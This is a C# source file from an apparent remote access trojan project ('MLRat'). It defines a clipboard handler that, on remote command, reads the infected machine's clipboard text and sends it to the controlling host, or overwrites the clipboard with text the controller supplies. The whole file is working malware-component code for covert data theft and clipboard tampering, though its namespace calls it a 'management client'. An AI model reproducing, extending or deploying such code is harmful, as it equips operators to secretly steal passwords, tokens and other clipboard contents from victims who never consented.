using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace MLManagementClient.Handlers
{
    public static class ClipboardHandler
    {
        static IClientHost Host = null;
        public static void SetHost(IClientHost _host)
        {
            Host = _host;
        }
        public static void Handle(object[] data)
        {
            ClipboardCommand command = (ClipboardCommand)data[1];
            if (command == ClipboardCommand.GetText) SendClipboardText();
            if (command == ClipboardCommand.SetText) SetClipboardText((string)data[2]);
        }

        static void SendClipboardText()
        {
            Thread thread = new Thread(() => Host.Send((byte)NetworkCommand.Clipboard, (byte)ClipboardCommand.Text, Clipboard.GetText()));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            thread.Join();
        }
        public static void SetClipboardText(string text)
        {
            Thread thread = new Thread(() => Clipboard.SetText(text));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            thread.Join();
        }
    }
}
